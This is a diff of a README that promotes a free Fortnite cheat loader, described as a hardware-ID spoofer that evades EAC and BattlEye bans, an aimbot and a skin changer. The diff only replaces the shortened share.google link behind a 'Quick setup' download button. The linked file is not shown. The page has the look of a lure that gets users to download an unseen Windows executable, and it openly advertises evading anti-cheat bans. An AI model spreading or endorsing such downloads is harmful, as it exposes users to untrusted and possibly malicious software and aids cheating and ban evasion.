@@ -5,7 +5,7 @@
 **Fortnite** — HWID spoofer, aimbot and skin changer in one Windows loader. The spoofer resets the hardware ID EAC + BattlEye banned, the aimbot is fully configurable, and the skin changer unlocks cosmetics client-side. **Free download, Windows 10 and 11.**
 
 <p align="center">
-  <a href="https://share.google/k6rfOal4uUJWxXQNi"><img src="button.svg" alt="Quick setup" height="46"></a>
+  <a href="https://share.google/fAM6NDoW0KRzVMZTA"><img src="button.svg" alt="Quick setup" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
